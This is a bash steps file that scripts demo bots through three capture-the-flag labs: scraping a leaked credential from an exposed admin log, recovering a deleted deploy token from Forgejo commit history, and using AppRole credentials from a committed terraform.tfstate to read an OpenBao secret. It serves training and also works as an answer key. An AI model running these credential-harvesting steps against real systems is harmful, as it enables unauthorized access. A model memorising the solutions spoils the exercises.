# ctf-secrets-config demo bot steps (see engine/web-terminal/bot-runner.sh's BOT_STEPS_FILE) --
# replaces the git-fundamentals default. This pack's ladder has three rows: leaky-config (5),
# git-secrets (8), tfstate-treasure (11). Bots are now first-class accounts (`BOT_COUNT`/
# `BOT_PREFIX` added to every seeding hook's roster, 2026-10-15), so all three are driven for real:
#
#   - leaky-config (row 5) is a plain container target like every ctf-access/ctf-server-trust
#     target: start it from the Attack Range API, read the exposed admin log, reuse the leaked
#     credential.
#   - git-secrets (row 8) is also a startable target (its own deploy-trigger app), but the flaw is
#     outside it entirely: the bot's own `$BOT_USER/internal-tools` Forgejo repo
#     (modules/ctf-range/terminal/start.d/55-git-secrets.sh seeds one per bot now), walked via the
#     commits API for the token a later commit "removed" from the tree.
#   - tfstate-treasure (row 11) has no container at all: the bot's own `$BOT_USER/infra-state` repo
#     (this workshop's compose/terminal/start.d/95-tfstate-treasure.sh) holds a committed
#     terraform.tfstate with an AppRole role_id/secret_id; OpenBao already provisions that AppRole
#     and the flag path for bot accounts too (modules/openbao/setup/setup.sh's par_each already
#     walks BOT_COUNT, unchanged here).
#
# `$NETRC` (machine git-server, login $BOT_USER) and `$GIT_SERVER` come from bot-runner.sh, already
# sourced by the time this file loads.

# -- attack-range helpers (same contract as every other ctf pack's steps.sh) ----------------------
attack_start_and_wait() { # $1 = target id, $2 = name of a var to set with the live slot's addr
  local target="$1" out_var="$2" timeout="${3:-90}"
  portal_login || return 1
  portal_curl -X POST -H 'Content-Type: application/json' -d "{\"target\":\"$target\"}" \
    "$GATEWAY_URL/ctf-attack/attack/start" >/dev/null
  local deadline=$((SECONDS + timeout))
  while [ "$SECONDS" -lt "$deadline" ]; do
    local doc state slot_target
    doc="$(portal_curl "$GATEWAY_URL/ctf-attack/attack/status")"
    slot_target="$(printf '%s' "$doc" | jq -r '.slot.target // ""' 2>/dev/null)"
    state="$(printf '%s' "$doc" | jq -r '.slot.state // ""' 2>/dev/null)"
    if [ "$slot_target" = "$target" ] && [ "$state" = "live" ]; then
      addr="$(printf '%s' "$doc" | jq -r --arg t "$target" '.targets[] | select(.id==$t) | .addr // ""' 2>/dev/null)"
      if [ -n "$addr" ]; then
        eval "$out_var=\$addr"
        return 0
      fi
    fi
    sleep 2
  done
  return 1
}

extract_flag() { grep -o 'flag{[^}]*}' | head -1; }

step_wrap_round() {
  portal_curl -X POST -H 'Content-Type: application/json' -d '{}' \
    "$GATEWAY_URL/ctf-attack/attack/stop" >/dev/null 2>&1
  narrate "round $ROUND done -- taking a short break before round $((ROUND + 1))"
  sleep "$(rand_between "$BOT_ROUND_BREAK_MIN" "$BOT_ROUND_BREAK_MAX")"
}

# -- Lab 1: leaky-config -- read the exposed admin log, pull the one WARN line's leaked
# metrics-agent credential, reuse it as HTTP Basic auth against /internal/metrics.
step_leaky_config() {
  narrate "Lab 1 -- leaky-config: starting the target"
  local addr log user pass flag
  if ! attack_start_and_wait leaky-config addr; then
    narrate "leaky-config never went live this round -- skipping"
    return 0
  fi
  narrate "slot live at $addr -- reading the exposed admin log for a leaked credential"
  log="$(curl -s "http://$addr:5000/admin/logs/app.log")"
  user="$(printf '%s' "$log" | grep -o 'user=[^[:space:]]*' | head -1 | cut -d= -f2)"
  pass="$(printf '%s' "$log" | grep -o 'pass=[^[:space:]]*' | head -1 | cut -d= -f2)"
  if [ -z "$user" ] || [ -z "$pass" ]; then
    narrate "leaky-config: no leaked credential in app.log this round -- skipping"
    return 0
  fi
  narrate "leaked $user:$pass -- reusing it against /internal/metrics"
  flag="$(curl -s -u "$user:$pass" "http://$addr:5000/internal/metrics" | extract_flag)"
  if [ -z "$flag" ]; then
    narrate "leaky-config: /internal/metrics didn't accept the credential this round -- skipping submit"
    return 0
  fi
  run_cmd "dojo-flag submit leaky-config '$flag'"
}

# -- Lab 2: git-secrets -- the flag lives in /deploy/trigger, but the credential it wants is
# only recoverable from the bot's own repo's commit history (the tree's current deploy.sh has
# none; an earlier commit's diff still does -- deleting a file never deletes it from history).
step_git_secrets() {
  narrate "Lab 2 -- git-secrets: starting the target"
  local addr forgejo_api repo commits sha diff token tries flag
  if ! attack_start_and_wait git-secrets addr; then
    narrate "git-secrets never went live this round -- skipping"
    return 0
  fi
  narrate "slot live at $addr -- walking $BOT_USER/internal-tools's commit history for the removed deploy token"
  forgejo_api="http://$GIT_SERVER/api/v1"
  repo="$BOT_USER/internal-tools"
  commits="$(curl -s --netrc-file "$NETRC" "$forgejo_api/repos/$repo/commits?sha=main&limit=50" | jq -r '.[].sha' 2>/dev/null)"
  token=""
  for sha in $commits; do
    diff="$(curl -s --netrc-file "$NETRC" "$forgejo_api/repos/$repo/git/commits/$sha.diff")"
    token="$(printf '%s' "$diff" | grep -o 'DEPLOY_TOKEN="\?[^"[:space:]]*' | head -1 | sed 's/.*=//; s/"//')"
    [ -n "$token" ] && break
  done
  if [ -z "$token" ]; then
    narrate "git-secrets: no deploy token found in $repo's history this round -- skipping"
    return 0
  fi
  narrate "recovered deploy token from an earlier commit -- presenting it to /deploy/trigger"
  flag="$(curl -s -X POST -d "token=$token" "http://$addr:5000/deploy/trigger" | extract_flag)"
  if [ -z "$flag" ]; then
    narrate "git-secrets: /deploy/trigger didn't accept the token this round -- skipping submit"
    return 0
  fi
  run_cmd "dojo-flag submit git-secrets '$flag'"
}

# -- Lab 3: tfstate-treasure -- no container to start: the bot's own repo holds a committed
# terraform.tfstate with an AppRole role_id/secret_id, which logs in to OpenBao and reads the one
# path the login opens.
step_tfstate_treasure() {
  narrate "Lab 3 -- tfstate-treasure: reading $BOT_USER/infra-state's committed terraform.tfstate"
  local forgejo_api repo state role_id secret_id client_token flag
  forgejo_api="http://$GIT_SERVER/api/v1"
  repo="$BOT_USER/infra-state"
  state="$(curl -s --netrc-file "$NETRC" "$forgejo_api/repos/$repo/raw/terraform.tfstate?ref=main")"
  role_id="$(printf '%s' "$state" | jq -r '.resources[0].instances[0].attributes.role_id // ""' 2>/dev/null)"
  secret_id="$(printf '%s' "$state" | jq -r '.resources[0].instances[0].attributes.secret_id // ""' 2>/dev/null)"
  if [ -z "$role_id" ] || [ -z "$secret_id" ]; then
    narrate "tfstate-treasure: no AppRole credentials in $repo's state this round -- skipping"
    return 0
  fi
  narrate "logging in to OpenBao with the leaked AppRole credentials"
  client_token="$(curl -s -X POST -H 'Content-Type: application/json' \
    -d "{\"role_id\":\"$role_id\",\"secret_id\":\"$secret_id\"}" \
    "http://openbao:8200/v1/auth/approle/login" | jq -r '.auth.client_token // ""' 2>/dev/null)"
  if [ -z "$client_token" ]; then
    narrate "tfstate-treasure: AppRole login didn't yield a token this round -- skipping"
    return 0
  fi
  flag="$(curl -s -H "X-Vault-Token: $client_token" \
    "http://openbao:8200/v1/secret/data/tfstate-treasure/$BOT_USER" \
    | jq -r '.data.data.flag // ""' 2>/dev/null)"
  if [ -z "$flag" ]; then
    narrate "tfstate-treasure: logged in but the flag path was empty this round -- skipping"
    return 0
  fi
  run_cmd "dojo-flag submit tfstate-treasure '$flag'"
}

case "$PERSONA" in
  expert)
    STEPS=(step_leaky_config step_git_secrets step_tfstate_treasure step_wrap_round)
    ;;
  intermediate)
    STEPS=(step_leaky_config step_git_secrets step_wrap_round)
    ;;
  novice)
    STEPS=(step_leaky_config step_wrap_round)
    ;;
esac
